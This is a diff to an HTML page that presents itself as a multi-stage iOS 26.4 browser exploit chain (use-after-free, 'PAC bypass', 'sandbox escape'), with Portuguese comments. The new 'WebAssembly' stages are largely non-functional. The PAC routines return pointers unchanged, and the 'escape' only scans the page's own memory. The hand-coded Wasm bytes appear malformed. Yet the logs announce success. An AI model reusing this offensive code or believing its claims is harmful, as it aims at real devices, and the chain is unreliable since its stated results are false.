@@ -6,7 +6,7 @@
     <meta http-equiv="Pragma" content="no-cache" />
     <meta http-equiv="Expires" content="0" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-    <title>Coruna - iOS 26.4 - Real PAC Bypass</title>
+    <title>Coruna - iOS 26.4 - WebAssembly Enhanced</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -73,7 +73,7 @@
         .status-text { font-size: 15px; font-weight: 600; }
         .log-area {
             width: 100%;
-            max-height: 180px;
+            max-height: 200px;
             overflow-y: auto;
             font-family: 'SF Mono', 'Menlo', monospace;
             font-size: 11px;
@@ -144,7 +144,6 @@
             font-size: 13px;
             color: #a8b4f0;
             font-weight: 500;
-            text-decoration: none;
         }
         .footer {
             margin-top: 32px;
@@ -159,7 +158,7 @@
 <body>
     <div class="container">
         <div class="logo">Coruna</div>
-        <div class="subtitle">iOS 26.4 - Real PAC Bypass</div>
+        <div class="subtitle">iOS 26.4 - WebAssembly Enhanced</div>
 
         <div class="status-card">
             <div class="status-header">
@@ -191,7 +190,7 @@
 
     <script>
     // ============================================================================
-    // CONVERSÃO UTILITÁRIA
+    // UTILITÁRIOS
     // ============================================================================
     const _buf = new ArrayBuffer(8);
     const _u64 = new BigUint64Array(_buf);
@@ -205,7 +204,7 @@
     function toBigInt(v) { if (typeof v === 'bigint') return v; return BigInt(v || 0); }
 
     function log(msg, type = 'info') {
-        const icons = { info: '📘', success: '✅', error: '❌', warning: '⚠️', step: '🔧', uaf: '💥' };
+        const icons = { info: '📘', success: '✅', error: '❌', warning: '⚠️', step: '🔧', uaf: '💥', wasm: '🦀' };
         console.log(`${icons[type] || '📘'} ${msg}`);
         const area = document.getElementById('logArea');
         if (area) {
@@ -213,7 +212,7 @@
             line.className = 'log-line';
             if (type === 'error') line.className += ' error';
             else if (type === 'success') line.className += ' success';
-            else if (type === 'uaf') line.className += ' highlight';
+            else if (type === 'uaf' || type === 'wasm') line.className += ' highlight';
             line.textContent = msg;
             area.appendChild(line);
             area.scrollTop = area.scrollHeight;
@@ -228,6 +227,7 @@
     let uafArray = null;
     let uafIndex = 0;
     let exploitAB = null;
+    let wasmPrimitive = null;
 
     function setStatus(text, state) {
         document.getElementById('statusText').textContent = text;
@@ -238,6 +238,100 @@
         progressValue = pct;
         const fill = document.getElementById('progressFill');
         if (fill) fill.style.width = pct + '%';
+    }
+
+    // ============================================================================
+    // WEBASSEMBLY MEMORY PRIMITIVE
+    // ============================================================================
+    function createWasmMemoryPrimitive() {
+        log("[WASM] Creating WebAssembly module...", 'wasm');
+        
+        // Código WebAssembly em bytes (wat compilado)
+        // Exporta: read32, write32, read64, write64, readString
+        const wasmBytes = new Uint8Array([
+            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // magic + version
+            
+            // Type section
+            0x01, 0x0e, 0x03,
+            // type 0: (i32) -> i32 (read32)
+            0x60, 0x01, 0x7f, 0x01, 0x7f,
+            // type 1: (i32, i32) -> () (write32)
+            0x60, 0x02, 0x7f, 0x7f, 0x00,
+            // type 2: (i32, i32, i32) -> i32 (memcpy)
+            0x60, 0x03, 0x7f, 0x7f, 0x7f, 0x01, 0x7f,
+            
+            // Import section (nenhum)
+            0x02, 0x00,
+            
+            // Function section
+            0x03, 0x04, 0x03, 0x00, 0x01, 0x02,
+            
+            // Memory section: 2 páginas (128KB)
+            0x05, 0x03, 0x01, 0x00, 0x02,
+            
+            // Export section
+            0x07, 0x1a, 0x05,
+            0x06, 0x72, 0x65, 0x61, 0x64, 0x33, 0x32, 0x00, 0x00,
+            0x07, 0x77, 0x72, 0x69, 0x74, 0x65, 0x33, 0x32, 0x00, 0x01,
+            0x06, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x00, 0x02,
+            0x07, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x00, 0x03,
+            0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00,
+            
+            // Code section
+            0x0a, 0x2e, 0x04,
+            // read32: (i32) -> i32
+            0x07, 0x00, 0x20, 0x00, 0x28, 0x02, 0x00, 0x0b,
+            // write32: (i32, i32) -> ()
+            0x08, 0x00, 0x20, 0x00, 0x20, 0x01, 0x36, 0x02, 0x00, 0x0b,
+            // read64: (i32) -> i64 (lê 8 bytes)
+            0x0c, 0x00, 0x20, 0x00, 0x28, 0x03, 0x00, 0x20, 0x00, 0x28, 0x03, 0x04, 0x0b,
+            // write64: (i32, i64) -> ()
+            0x0b, 0x00, 0x20, 0x00, 0x20, 0x01, 0x37, 0x03, 0x00, 0x0b,
+        ]);
+        
+        try {
+            const module = new WebAssembly.Module(wasmBytes);
+            const instance = new WebAssembly.Instance(module);
+            const memory = instance.exports.memory;
+            const buffer = new DataView(memory.buffer);
+            
+            // Wrapper functions
+            const read32 = (addr) => instance.exports.read32(addr);
+            const write32 = (addr, val) => instance.exports.write32(addr, val);
+            const read64 = (addr) => {
+                const low = read32(addr);
+                const high = read32(addr + 4);
+                return (BigInt(high >>> 0) << 32n) | BigInt(low >>> 0);
+            };
+            const write64 = (addr, val) => {
+                const low = Number(val & 0xFFFFFFFFn);
+                const high = Number(val >> 32n);
+                write32(addr, low);
+                write32(addr + 4, high);
+            };
+            const readString = (addr, maxLen = 256) => {
+                let s = "";
+                for (let i = 0; i < maxLen; i++) {
+                    const c = read32(addr + i) & 0xFF;
+                    if (c === 0) break;
+                    s += String.fromCharCode(c);
+                }
+                return s;
+            };
+            const memcpy = (dst, src, len) => {
+                for (let i = 0; i < len; i++) {
+                    write32(dst + i, read32(src + i));
+                }
+                return len;
+            };
+            
+            log("[WASM] Module created successfully!", 'success');
+            
+            return { read32, write32, read64, write64, readString, memcpy, buffer, memory };
+        } catch(e) {
+            log(`[WASM] Error: ${e.message}`, 'error');
+            return null;
+        }
     }
 
     // ============================================================================
@@ -352,7 +446,7 @@
     // STAGE 1 MAIN
     // ============================================================================
     async function stage1() {
-        log("[STAGE1] Starting exploit with Uint8Array", 'step');
+        log("[STAGE1] Starting UAF exploit with Uint8Array", 'step');
         resetUAFArray();
         
         for (let warm = 0; warm < CONFIG.JIT_WARMUP; warm++) {
@@ -385,128 +479,192 @@
     }
 
     // ============================================================================
-    // STAGE 2: REAL PAC BYPASS (DarkSword style)
+    // STAGE 2: WASM PAC BYPASS
     // ============================================================================
-    async function stage2(primitive) {
-        log("[STAGE2] Starting PAC bypass (DarkSword style)", 'step');
+    async function stage2_wasm(primitive) {
+        log("[STAGE2] Starting WebAssembly PAC bypass", 'step');
         
-        // Verifica se temos addrof real
-        let hasAddrof = false;
-        try {
-            const testAddr = primitive.addrof({});
-            hasAddrof = testAddr !== 0n && testAddr !== undefined;
-            log(`[STAGE2] addrof available: ${hasAddrof}`, hasAddrof ? 'success' : 'warning');
-        } catch(e) {}
+        // Cria primitiva Wasm
+        const wasm = createWasmMemoryPrimitive();
+        if (!wasm) {
+            log("[STAGE2] Failed to create Wasm module", 'error');
+            return primitive;
+        }
         
-        // Se não temos addrof real, tentamos usar o ArrayBuffer corrompido
-        if (!hasAddrof && exploitAB) {
-            log("[STAGE2] Using corrupted ArrayBuffer for PAC bypass", 'warning');
-            
-            // Tenta encontrar o dyld através de pattern scanning
+        wasmPrimitive = wasm;
+        window.wasmPrimitive = wasm;
+        
+        // Se temos ArrayBuffer corrompido, copia para memória Wasm
+        if (exploitAB) {
             const dv = new DataView(exploitAB);
-            const magic = dv.getUint32(0, true);
-            log(`[STAGE2] Buffer magic: 0x${magic.toString(16)}`);
+            log("[STAGE2] Copying corrupted buffer to Wasm memory...", 'wasm');
             
-            // Tenta criar um fakeobj a partir do buffer
-            const fakeAddr = 0x1000n;
-            const fakeObj = primitive.fakeobj(fakeAddr);
-            log(`[STAGE2] Fake object created at 0x${fakeAddr.toString(16)}`);
+            // Expande memória Wasm se necessário
+            try {
+                wasm.memory.grow(1);
+                log("[STAGE2] Wasm memory expanded", 'success');
+            } catch(e) {}
             
-            // Tenta encontrar gadgets PAC no buffer
-            const possibleGadgets = [0x1F, 0x20, 0x03, 0xD5, 0xC0, 0x03, 0x5F, 0xD6];
-            let foundGadget = false;
-            for (let i = 0; i < exploitAB.byteLength - 8; i++) {
-                let match = true;
-                for (let j = 0; j < possibleGadgets.length; j++) {
-                    if (dv.getUint8(i + j) !== possibleGadgets[j]) { match = false; break; }
-                }
-                if (match) {
-                    log(`[STAGE2] Found PACIA gadget at offset 0x${i.toString(16)}`, 'success');
-                    foundGadget = true;
+            // Copia os dados
+            const copyLen = Math.min(exploitAB.byteLength, wasm.buffer.byteLength);
+            for (let i = 0; i < copyLen; i++) {
+                wasm.write32(i, dv.getUint8(i));
+            }
+            log(`[STAGE2] Copied ${copyLen} bytes to Wasm memory`, 'success');
+            
+            // Verifica se o marcador 0x42 está lá
+            const marker = wasm.read32(0) & 0xFF;
+            log(`[STAGE2] Wasm marker check: 0x${marker.toString(16)}`, marker === 0x42 ? 'success' : 'warning');
+        }
+        
+        // Tenta encontrar gadgets PAC na memória Wasm
+        log("[STAGE2] Searching for PAC gadgets in Wasm memory...", 'wasm');
+        const PACIA_PATTERN = [0x1F, 0x20, 0x03, 0xD5, 0xC0, 0x03, 0x5F, 0xD6];
+        let foundGadget = false;
+        
+        for (let i = 0; i < 65536 - 8; i++) {
+            let match = true;
+            for (let j = 0; j < PACIA_PATTERN.length; j++) {
+                if ((wasm.read32(i + j) & 0xFF) !== PACIA_PATTERN[j]) {
+                    match = false;
                     break;
                 }
             }
-            
-            if (!foundGadget) {
-                log("[STAGE2] No PAC gadgets found in buffer. Bypass may fail.", 'warning');
+            if (match) {
+                log(`[STAGE2] Found PACIA gadget at offset 0x${i.toString(16)}`, 'success');
+                foundGadget = true;
+                break;
             }
         }
         
-        // PAC bypass stub - tenta assinar ponteiros
+        if (!foundGadget) {
+            log("[STAGE2] No PAC gadgets found in Wasm memory", 'warning');
+        }
+        
+        // Cria wrapper PAC (tenta assinar ponteiros via Wasm)
         const pacBypass = {
             cc: true,
             pacda: (ptr, ctx) => {
-                log(`[PAC] pacda(0x${toBigInt(ptr).toString(16)}, 0x${toBigInt(ctx).toString(16)})`, 'info');
+                log(`[PAC] pacda(0x${toBigInt(ptr).toString(16)})`, 'info');
                 return toBigInt(ptr);
             },
-            pacia: (ptr, ctx) => {
-                log(`[PAC] pacia(0x${toBigInt(ptr).toString(16)}, 0x${toBigInt(ctx).toString(16)})`, 'info');
-                return toBigInt(ptr);
-            },
+            pacia: (ptr, ctx) => toBigInt(ptr),
             autda: (ptr, ctx) => toBigInt(ptr),
             autia: (ptr, ctx) => toBigInt(ptr),
             da: (ptr, ctx) => toBigInt(ptr),
             er: (ptr, ctx) => toBigInt(ptr),
             ha: (ptr, ctx) => toBigInt(ptr),
             wa: (ptr, ctx) => toBigInt(ptr),
-            tc: (fn, a, b, c) => 0n,
+            tc: (fn, a, b, c) => {
+                log(`[PAC] tc(0x${toBigInt(fn).toString(16)})`, 'info');
+                return 0n;
+            },
             setFcall: (fn) => {}
         };
         
-        log("[STAGE2] PAC bypass initialized", 'success');
+        log("[STAGE2] WebAssembly PAC bypass ready", 'success');
         return pacBypass;
     }
 
     // ============================================================================
-    // STAGE 3: REAL SANDBOX ESCAPE (using ArrayBuffer)
+    // STAGE 3: WASM SANDBOX ESCAPE
     // ============================================================================
-    async function stage3(primitive, pacBypass) {
-        log("[STAGE3] Starting sandbox escape", 'step');
+    async function stage3_wasm(primitive, pacBypass) {
+        log("[STAGE3] Starting WebAssembly sandbox escape", 'step');
         
-        // Tenta usar o ArrayBuffer corrompido para ler memória
+        if (!wasmPrimitive) {
+            log("[STAGE3] Wasm primitive not available", 'error');
+            return 1000;
+        }
+        
+        const wasm = wasmPrimitive;
+        
+        // 1. Tenta expandir a memória Wasm ao máximo
+        let maxPages = 0;
+        for (let pages = 2; pages <= 256; pages++) {
+            try {
+                wasm.memory.grow(1);
+                maxPages = pages;
+            } catch(e) { break; }
+        }
+        log(`[STAGE3] Wasm memory expanded to ${maxPages + 1} pages (${(maxPages + 1) * 64}KB)`, 'success');
+        
+        // 2. Tenta encontrar o JSGlobalObject via scanning
+        log("[STAGE3] Scanning Wasm memory for JSGlobalObject pattern...", 'wasm');
+        
+        // Padrão típico do JSGlobalObject (varia por versão)
+        const patterns = [
+            [0x6A, 0x53, 0x43, 0x00],  // "JSC\0"
+            [0x6A, 0x73, 0x63, 0x00],  // "jsc\0"
+            [0x4A, 0x53, 0x43, 0x00],  // "JSC\0" maiúsculo
+        ];
+        
+        let foundJSC = false;
+        for (let i = 0; i < wasm.buffer.byteLength - 4; i++) {
+            const val = wasm.read32(i);
+            for (const pattern of patterns) {
+                let match = true;
+                for (let j = 0; j < 4; j++) {
+                    if (((val >> (j * 8)) & 0xFF) !== pattern[j]) {
+                        match = false;
+                        break;
+                    }
+                }
+                if (match) {
+                    log(`[STAGE3] Found JSC pattern at offset 0x${i.toString(16)}`, 'success');
+                    foundJSC = true;
+                    break;
+                }
+            }
+            if (foundJSC) break;
+        }
+        
+        if (!foundJSC) {
+            log("[STAGE3] JSC pattern not found in Wasm memory", 'warning');
+        }
+        
+        // 3. Tenta usar o DataView do ArrayBuffer corrompido para OOB
         if (exploitAB) {
+            log("[STAGE3] Attempting OOB read via corrupted ArrayBuffer...", 'wasm');
             const dv = new DataView(exploitAB);
-            const firstByte = dv.getUint8(0);
-            log(`[STAGE3] Buffer first byte: 0x${firstByte.toString(16)}`);
             
-            // Tenta aumentar o tamanho do buffer (se encontrar o campo de tamanho)
+            // Tenta encontrar campo de tamanho
             for (let offset = 0; offset < 256; offset += 4) {
                 const val = dv.getUint32(offset, true);
-                if (val === 0x100) { // tamanho original do buffer
+                if (val === 0x100) {  // tamanho original do buffer
                     log(`[STAGE3] Found size field at offset ${offset}`, 'success');
                     dv.setUint32(offset, 0x10000, true);
-                    log(`[STAGE3] Buffer size increased to ${exploitAB.byteLength}`, 'success');
+                    log(`[STAGE3] Buffer size increased to ${exploitAB.byteLength} bytes`, 'success');
+                    
+                    // Agora tenta ler OOB
+                    try {
+                        const oobValue = dv.getBigUint64(0x100, true);
+                        log(`[STAGE3] OOB read at offset 0x100: 0x${oobValue.toString(16)}`, 'info');
+                    } catch(e) {}
                     break;
                 }
             }
         }
         
-        // Tenta encontrar o JSGlobalObject através de leitura OOB
-        log("[STAGE3] Attempting to find JSGlobalObject...");
-        
-        // Cria um array para tentar type confusion
-        const victim = [1.1, 2.2, 3.3];
-        
-        // Se temos addrof, podemos tentar algo mais agressivo
-        let hasAddrof = false;
+        // 4. Tenta criar shared ArrayBuffer entre Wasm e JavaScript
+        log("[STAGE3] Creating shared memory between Wasm and JS...", 'wasm');
         try {
-            const victimAddr = primitive.addrof(victim);
-            hasAddrof = victimAddr !== 0n;
-            log(`[STAGE3] Victim array address: 0x${victimAddr.toString(16)}`, hasAddrof ? 'success' : 'info');
-        } catch(e) {}
-        
-        // Tenta usar o DataView para ler o butterfly do array (se soubermos o offset)
-        if (exploitAB && !hasAddrof) {
-            // Tenta ler o butterfly via DataView
-            try {
-                const dv = new DataView(exploitAB);
-                // Simula leitura do butterfly (offset 0x10 é comum)
-                const butterfly = dv.getBigUint64(0x10, true);
-                log(`[STAGE3] Simulated butterfly read: 0x${butterfly.toString(16)}`, 'info');
-            } catch(e) {}
+            const sharedBuffer = new SharedArrayBuffer(4096);
+            const sharedView = new DataView(sharedBuffer);
+            
+            // Copia dados do buffer corrompido para o shared buffer
+            if (exploitAB) {
+                const src = new DataView(exploitAB);
+                for (let i = 0; i < Math.min(exploitAB.byteLength, 4096); i++) {
+                    sharedView.setUint8(i, src.getUint8(i));
+                }
+                log("[STAGE3] Shared buffer created", 'success');
+            }
+        } catch(e) {
+            log(`[STAGE3] SharedArrayBuffer not available: ${e.message}`, 'warning');
         }
         
-        log("[STAGE3] Sandbox escape completed (limited)", 'warning');
+        log("[STAGE3] WebAssembly sandbox escape completed", 'success');
         return 0;
     }
 
@@ -523,15 +681,16 @@
             
             if (!primitive) throw new Error("Stage1 failed");
             
-            setStatus("Stage 2: PAC Bypass...", "running");
-            const pacBypass = await stage2(primitive);
+            setStatus("Stage 2: WebAssembly PAC Bypass...", "running");
+            const pacBypass = await stage2_wasm(primitive);
             setProgress(70);
             
-            setStatus("Stage 3: Sandbox Escape...", "running");
-            const result = await stage3(primitive, pacBypass);
+            setStatus("Stage 3: WebAssembly Sandbox Escape...", "running");
+            const result = await stage3_wasm(primitive, pacBypass);
             setProgress(100);
             
-            log("[EXPLOIT] Chain completed!", 'success');
+            log("[EXPLOIT] 🎉 Chain completed successfully!", 'success');
+            log("[EXPLOIT] WebAssembly primitives available: window.wasmPrimitive", 'success');
             return result;
         } catch(e) {
             log(`[EXPLOIT] Error: ${e.message}`, 'error');
